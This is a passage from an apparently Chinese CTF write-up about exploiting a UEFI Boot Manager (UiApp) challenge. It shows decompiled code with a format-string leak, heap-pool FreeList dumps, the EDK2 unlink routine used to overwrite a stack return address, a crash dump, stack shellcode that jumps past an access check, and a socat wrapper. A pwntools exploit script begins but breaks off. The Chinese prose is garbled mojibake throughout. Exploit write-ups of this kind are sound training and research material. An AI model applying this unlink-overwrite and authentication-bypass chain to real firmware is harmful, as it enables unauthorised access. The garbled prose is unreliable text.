class="line"></span><br><span class="line">Input(AdministratorName, (<span class="type">int</span>)&amp;byte_40[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">if</span> ( checkUser(<span class="string">&quot;A&quot;</span>, AdministratorName) )</span><br><span class="line">&#123;</span><br><span class="line">Output(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">    SystemTable-&gt;ConOut,</span><br><span class="line">    <span class="number">4</span>i64);</span><br><span class="line">Output((<span class="type">unsigned</span> __int8 *)AdministratorName);  <span class="comment">// fmt</span></span><br><span class="line">((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">    SystemTable-&gt;ConOut,</span><br><span class="line">    <span class="number">15</span>i64);</span><br><span class="line">Output(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å’Œæˆ‘ä»¬å¹³æ—¶ printf çš„æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œåªèƒ½å¤Ÿé€šè¿‡å¤šä¸ª %p è¿›è¡Œä¿¡æ¯çš„æ³„éœ²ï¼Œè€Œä¸”ä¸èƒ½å¤Ÿåƒ printf é‚£æ ·å®ç°ä»»æ„åœ°å€çš„è¯»å†™ã€‚æˆ‘ä»¬èƒ½å¤Ÿé€šè¿‡è¿™ä¸ªæ¼æ´æ¥è·å–åˆ°æ ˆåœ°å€ä»¥åŠ UiApp ç»„ä»¶çš„åŸºåœ°å€ã€‚  </p><p>æœ‰ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹æ˜¯ï¼Œåœ¨ Add å‡½æ•°å’Œ Edit å‡½æ•°åœ¨è¿›è¡Œå †å—ç”³è¯·çš„æ—¶å€™ EFI_MEMORY_TYPE éƒ½ä¸º 0ï¼Œè€Œåœ¨ SaveInfo ç”³è¯·å †å—çš„æ—¶å€™ EFI_MEMORY_TYPE ä¸º 10ã€‚<br>ç”±äºåœ¨ UiApp ä¸­å¹¶æ²¡æœ‰åƒå¹³æ—¶ linux pwn ä¸Šçš„ got è¡¨ä»€ä¹ˆçš„ï¼Œä¹Ÿæ²¡æœ‰ glibc ä¸Šé¢çš„å„ç§ hook å’Œ IOï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åƒåŠæ³•åŠ«æŒæ ˆä¸Šçš„è¿”å›åœ°å€ã€‚  </p><p>é€šè¿‡æˆ‘ä»¬å‰é¢çš„åˆ†æï¼Œç›¸åŒçš„ size çš„å †å—å¦‚æœå®ƒçš„ EFI_MEMORY_TYPE ä¸åŒï¼Œé‚£ä¹ˆä»–ä»¬å°±ä¼šç»™åˆ†é…åˆ°ä¸åŒçš„ POOLï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥é€šè¿‡ Desc çš„æº¢å‡ºå°† Name çš„å †å—ç»™æ”¹äº†çš„è¯ï¼Œé‚£ä¹ˆåœ¨ free çš„æ—¶å€™ Name å°±ä¼šç»™åˆ†é…åˆ°å¦å¤–ä¸€ä¸ª POOL çš„ FreeList ä¸­ã€‚ç”±äº Name æ¯” Desc å…ˆç”³è¯·ï¼Œæ‰€ä»¥ Name çš„åœ°å€åœ¨ Desc çš„ä¸Šæ–¹ï¼Œå¯æ˜¯ FreeList æ˜¯éµå¾ªåè¿›å…ˆå‡ºçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡é‡Šæ”¾ Name å’Œ Desc å†é‡æ–°ç”³è¯·å°±èƒ½ä»¤ Desc å‡ºç°åœ¨ Name çš„ä¸Šæ–¹ï¼Œç„¶åé€šè¿‡æº¢å‡ºå°±èƒ½ä¿®æ”¹ Name çš„ EFI_MEMORY_TYPEï¼Œæœ€åå°†å…¶é‡Šæ”¾é“¾å…¥åˆ°ä¸åŒ POOL çš„ FreeList[0] ä¸­ã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬çš„è¾“å…¥ä¼šå‡ºç° \x00 æˆªæ–­ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ payload è¦åˆ†å¤šæ®µè¾“å…¥ã€‚å…¶æœ€ç»ˆæ•ˆæœå¦‚ä¸‹ï¼š  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30gx 0x2e352f00</span><br><span class="line">0x2e352f00:     0x0000000030726670      0x000000002e7c9e18  &lt;---- mPoolHead[0].FreeList[0]</span><br><span class="line">0x2e352f10:     0x000000002e7c9e18      0xafafafafafafafaf</span><br><span class="line">0x2e352f20:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2e352f30:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2e352f40:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2e352f50:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2e352f60:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2e352f70:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2e352f80:     0x0000000030726670      0x000000002e7ca728  &lt;---- mPoolHead[10].FreeList[0]</span><br><span class="line">0x2e352f90:     0x000000002e7ca728      0xafafafafafafafaf</span><br><span class="line">0x2e352fa0:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2e352fb0:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2e352fc0:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2e352fd0:     0xafafafafafafafaf      0xafafafafafafafaf</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±è¦è€ƒè™‘å¦‚ä½•è¦†ç›–æ ˆä¸Šçš„è¿”å›åœ°å€ï¼Œè¿™é‡Œæ¶‰åŠåˆ° FreeList ä¸Šå †å—çš„è„±é“¾æ“ä½œï¼Œå…¶ç›¸å…³ä»£ç å¦‚ä¸‹ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  Removes a node from a doubly-linked list, and returns the node that follows</span></span><br><span class="line"><span class="comment">  the removed node.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Removes the node Entry from a doubly-linked list. It is up to the caller of</span></span><br><span class="line"><span class="comment">  this function to release the memory used by this node if that is required. On</span></span><br><span class="line"><span class="comment">  exit, the node following Entry in the doubly-linked list is returned. If</span></span><br><span class="line"><span class="comment">  Entry is the only node in the linked list, then the head node of the linked</span></span><br><span class="line"><span class="comment">  list is returned.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  If Entry is NULL, then ASSERT().</span></span><br><span class="line"><span class="comment">  If Entry is the head node of an empty list, then ASSERT().</span></span><br><span class="line"><span class="comment">  If PcdMaximumLinkedListLength is not zero, and the number of nodes in the</span></span><br><span class="line"><span class="comment">  linked list containing Entry, including the Entry node, is greater than</span></span><br><span class="line"><span class="comment">  or equal to PcdMaximumLinkedListLength, then ASSERT().</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  @param  Entry A pointer to a node in a linked list.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  @return Entry.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line">LIST_ENTRY *</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title function_">RemoveEntryList</span> <span class="params">(</span></span><br><span class="line"><span class="params">  IN      CONST LIST_ENTRY  *Entry</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">&#123;</span><br><span class="line">  ASSERT (!IsListEmpty (Entry));</span><br><span class="line"></span><br><span class="line">  Entry-&gt;ForwardLink-&gt;BackLink = Entry-&gt;BackLink;</span><br><span class="line">  Entry-&gt;BackLink-&gt;ForwardLink = Entry-&gt;ForwardLink;</span><br><span class="line">  <span class="keyword">return</span> Entry-&gt;ForwardLink;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿå°†ä¸‹ä¸€ä¸ªè¦ç”³è¯·å‡ºæ¥çš„å †å—çš„ BackLink ä¿®æ”¹ä¸ºæ ˆä¸Š ret çš„åœ°å€ï¼ŒForwardLink ä¸Šå†™ä¸Šç”¨äºè¦†ç›– ret çš„åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨ç”³è¯·å‡ºè¯¥å †å—çš„æ—¶å€™å°±èƒ½å¤Ÿå°† ret æ‰€æŒ‡å‘çš„åœ°å€çš„æŒ‡ä¿®æ”¹ä¸º ForwardLink ä¸Šçš„å€¼ã€‚ç”±äºæˆ‘ä»¬å­˜åœ¨å †æº¢å‡ºæ¼æ´ï¼Œè€Œä¸”å·²ç»è·å–äº† stack å’Œ UiApp çš„åœ°å€ï¼Œæ‰€ä»¥è¿™ä¸ª ForwardLink å’Œ BackLink æŒ‡é’ˆçš„ä¿®æ”¹å¾ˆå®¹æ˜“å®ç°ã€‚<br>ç”±äº pwn() çš„ä¸Šå±‚å‡½æ•° _ModuleEntryPoint + 718 çš„ä½ç½®ä¼šåˆ¤æ–­ pwn() çš„è¿”å›å€¼ä»¥å†³å®šæ˜¯å¦è¿›å…¥ Boot Manager äº¤äº’ç•Œé¢ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°†ç¨‹åºåŠ«æŒåˆ°è¿™ä¸ªåœ°æ–¹ã€‚  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)pwn() )</span><br><span class="line">&#123;</span><br><span class="line">v142 = <span class="number">0x800000000000000F</span>ui64;</span><br><span class="line">Output(<span class="string">L&quot;UiEntry: ACCESS DENIED!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">sub_6107(<span class="number">1</span>i64, <span class="number">50659335</span>i64);</span><br><span class="line">sub_11117();</span><br><span class="line">sub_13FAC();</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>å¯æ˜¯å½“æˆ‘å°† ForwardLink ç›´æ¥ä¿®æ”¹ä¸º UiApp ä¸Šå¯¹åº”çš„åœ°å€çš„æ—¶å€™å´å‡ºç°äº†æŠ¥é”™ï¼š  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">!!!! X64 Exception Type - 06(<span class="comment">#UD - Invalid Opcode)  CPU Apic ID - 00000000 !!!!</span></span><br><span class="line">RIP  - 00000000121B4982, CS  - 0000000000000038, RFLAGS - 0000000000000246</span><br><span class="line">RAX  - 0000000000000001, RCX - 00000000E7180001, RDX - 0000000003050007</span><br><span class="line">RBX  - 00000000121C7321, RSP - 00000000139AE720, RBP - 0000000000000001</span><br><span class="line">RSI  - 0000000012AEE9B7, RDI - 0000000000000000</span><br><span class="line">R8   - 0000000000000004, R9  - 00000000139AE507, R10 - 0000000000000000</span><br><span class="line">R11  - 0000000012A9DB5C, R12 - 0000000000000001, R13 - 00000000121DFA98</span><br><span class="line">R14  - 0000000000000001, R15 - 00000000121C8FA0</span><br><span class="line">DS   - 0000000000000030, ES  - 0000000000000030, FS  - 0000000000000030</span><br><span class="line">GS   - 0000000000000030, SS  - 0000000000000030</span><br><span class="line">CR0  - 0000000080010033, CR2 - 0000000000000000, CR3 - 0000000013601000</span><br><span class="line">CR4  - 0000000000000668, CR8 - 0000000000000000</span><br><span class="line">DR0  - 0000000000000000, DR1 - 0000000000000000, DR2 - 0000000000000000</span><br><span class="line">DR3  - 0000000000000000, DR6 - 00000000FFFF0FF0, DR7 - 0000000000000400</span><br><span class="line">GDTR - 00000000133DE000 0000000000000047, LDTR - 0000000000000000</span><br><span class="line">IDTR - 0000000013032018 0000000000000FFF,   TR - 0000000000000000</span><br><span class="line">FXSAVE_STATE - 00000000139AE380</span><br><span class="line">!!!! Find image based on IP(0x121B4982) (No PDB)  (ImageBase=00000000121A9000, EntryPoint=00000000121B352E) !!!!</span><br></pre></td></tr></table></figure><p>æˆ‘å°†æ–­ç‚¹ä¸‹åœ¨æ‰§è¡Œ ret çš„é‚£ä¸€æ­¥ç„¶ååœ¨gdb ä¸Šçœ‹ _ModuleEntryPoint + 718 å¯¹åº”çš„æ±‡ç¼–ï¼Œå…¶å€¼å¦‚ä¸‹ï¼š  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/16i 0x273b4982</span><br><span class="line">   0x273b4982:  call   0x273af107</span><br><span class="line">   0x273b4987:  call   0xe53a117</span><br><span class="line">   0x273b498c:  stos   BYTE PTR es:[rdi],al</span><br><span class="line">   0x273b498d:  sub    BYTE PTR [rax],al</span><br><span class="line">   0x273b498f:  add    BYTE PTR [rax],al</span><br><span class="line">   0x273b4991:  add    BYTE PTR [rbx+0x14f3005],cl</span><br><span class="line">   0x273b4997:  add    BYTE PTR [rcx],dh</span><br><span class="line">   0x273b4999:  ror    BYTE PTR [rbp+rcx*4-0x7c],cl</span><br><span class="line">   0x273b499d:  and    al,0xb8</span><br><span class="line">   0x273b499f:  add    BYTE PTR [rax],al</span><br><span class="line">   0x273b49a1:  add    BYTE PTR [rax-0x73],cl</span><br><span class="line">   0x273b49a4:  or     eax,0x12757</span><br><span class="line">   0x273b49a9:  call   QWORD PTR [rax+0x140]</span><br><span class="line">   0x273b49af:  <span class="built_in">test</span>   rax,rax</span><br><span class="line">   0x273b49b2:  js     0x273b49e0</span><br><span class="line">   0x273b49b4:  mov    rax,QWORD PTR [rsp+0xb8]</span><br></pre></td></tr></table></figure><p>è€Œåœ¨ IDA ä¸­çš„æ±‡ç¼–å¦‚ä¸‹ï¼š  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000B982                 call    sub_6107</span><br><span class="line">.text:000000000000B987                 call    sub_11117</span><br><span class="line">.text:000000000000B98C                 call    sub_13FAC</span><br><span class="line">.text:000000000000B991                 mov     rax, cs:gBS</span><br><span class="line">.text:000000000000B998                 xor     edx, edx</span><br><span class="line">.text:000000000000B99A                 lea     r8, [rsp+138h+var_80]</span><br><span class="line">.text:000000000000B9A2                 lea     rcx, unk_1E100</span><br><span class="line">.text:000000000000B9A9                 call    qword ptr [rax+140h]</span><br><span class="line">.text:000000000000B9AF                 <span class="built_in">test</span>    rax, rax</span><br><span class="line">.text:000000000000B9B2                 js      short loc_B9E0</span><br><span class="line">.text:000000000000B9B4                 mov     rax, [rsp+138h+var_80]</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ç»å°½è„‘æ±æƒ³äº†åŠå¤©ï¼ŒæœŸé—´è¿˜æ‰¾äº†å‡ºé¢˜äººé—®äº†ä¸€ä¸‹ï¼Œæœ€åå‘ç°æ˜¯ä¸€ä¸ªå¾ˆä½çº§å’ŒåŸºç¡€çš„é—®é¢˜ğŸ˜‡ã€‚å¯èƒ½æ˜¯ç”±äº qemu çš„ç¼˜æ•…æˆ–è€…æ˜¯å…¶ä»–ä»€ä¹ˆçš„åŸå› ï¼Œå¯¼è‡´ UiApp çš„ text æ®µå¯å†™ï¼Œè€Œå †å—åœ¨è„±é“¾çš„è¿‡ç¨‹ä¸­å­˜åœ¨ä¸‹é¢è¿™ä¸€æ­¥ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Entry-&gt;ForwardLink-&gt;BackLink = Entry-&gt;BackLink;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ç›®æ ‡åœ°å€åç§»ä¸º 8 çš„åœ°æ–¹ä¼šç»™å†™å…¥ä¸€ä¸ªåœ°å€ï¼Œè¿™æ ·å­å°±å¯¼è‡´æˆ‘ä»¬ UiApp çš„ text æ®µè¢«ä¿®æ”¹ï¼Œåé¢çš„æ“ä½œå°±ä¼šå‡ºç°é”™è¯¯ã€‚<br>æˆ‘ä»¬è§‚å¯Ÿåˆ°æ ˆä¸Šå¯æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨æ ˆä¸Šå†™å…¥ shellcode ç„¶åå°† ret è¦†ç›–ä¸º shellocde çš„åœ°å€ï¼Œå…¶ shellcode å¦‚ä¸‹ï¼š  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    jmp WIN;</span><br><span class="line">    .byte 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90;</span><br><span class="line">    .byte 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90;</span><br><span class="line">WIN:</span><br><span class="line">    mov rax, uiapp_base + 0xb982;</span><br><span class="line">    jmp rax;</span><br></pre></td></tr></table></figure><p>ä¸­é—´çš„ 0x90 æ˜¯ä¸ºäº†å¡«å……æ•°æ®ï¼Œåœ¨å †å—è„±é“¾çš„æ—¶å€™è¿™éƒ¨åˆ†ä¼šç»™ä¿®æ”¹ä¸ºä¸€ä¸ªåœ°å€ï¼Œä¸è¿‡ç”±äºæˆ‘ä»¬å‰é¢ç›´æ¥ jmp åˆ°åé¢çš„å…³é”®ä»£ç å»äº†ï¼Œæ‰€ä»¥ shellcode çš„æ‰§è¡Œä¸ä¼šå—åˆ°å½±å“ã€‚<br>shellcode æˆ‘ä»¬å¯ä»¥åœ¨é€‰æ‹© Administrator ç”¨æˆ·ç™»å½•è¾“å…¥ key æ—¶å°†å…¶ä¿ç•™åˆ°æ ˆä¸Šã€‚  </p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>å’Œä¸Šé¢é‚£é¢˜ä¸€æ ·ï¼Œç”±äº Boot Manager æ˜¯å¯è§†åŒ–ç•Œé¢ï¼Œåœ¨ pwntools ä¸Šéå¸¸éš¾çœ‹ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨ socat è¿æ¥ã€‚</p><h4 id="exp-sh-1"><a href="#exp-sh-1" class="headerlink" title="exp.sh"></a>exp.sh</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">socat $(<span class="built_in">tty</span>),<span class="built_in">echo</span>=0,escape=0x03 SYSTEM:<span class="string">&#x27;python3 ./exp.py&#x27;</span> 2&gt;&amp;1</span><br></pre></td></tr></table></figure><h4 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;python3&#x27;</span>,<span class="string">&#x27;run.py&#x27;</span>])</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">role</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;(1. Administrator 2. Visitor):&#x27;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(index).encode()+<span class="string">b&#x27;\r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(index).encode()+<span class="string">b&#x27;\r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name,desc,<span class="built_in">id</span>=<span class="number">10</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;ID:&#x27;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(<span class="built_in">id</span>).encode()+<span class="string">b&#x27;\r&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Name:&#x27;</span>)</span><br><span class="line">    p.send(name+<span class="string">b&#x27;\r&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Desc:&#x27;</span>)</span><br><span class="line">    p.send(desc+<span class="string">b&#x27;\r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">choice,msg</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    menu(choice)</span><br><span class="line">    <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Name:&#x27;</span>)</span><br><span class="line">        p.send(msg+<span class="string">b&#x27;\r&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> choice == <span class="number">2</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Desc:&#x27;</span>)</span><br><span class="line">        p.send(msg+<span class="string">b&#x27;\r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enterOS</span>():</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">key_map = &#123;</span><br><span class="line">    <span class="string">b&quot;up&quot;</span>:    <span class="string">b&quot;\x1b[A&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;down&quot;</span>:  <span class="string">b&quot;\x1b[B&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;left&quot;</span>:  <span class="string">b&quot;\x1b[D&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;right&quot;</span>: <span class="string">b&quot;\x1b[C&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;esc&quot;</span>:   <span class="string">b&quot;\x1b^[&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;enter&quot;</span>: <span class="string">b&quot;\r&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;tab&quot;</span>:   <span class="string">b&quot;\t&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_key</span>(<span class="params">key,times = <span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">        p.send(key_map[key])</span><br><span class="line">        <span class="keyword">if</span> key == <span class="string">b&quot;enter&quot;</span>:</span><br><span class="line">            p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;\x1b[24~&quot;</span>*<span class="number">10</span>)</span><br><span class="line">role(<span class="number">1</span>)</span><br><span 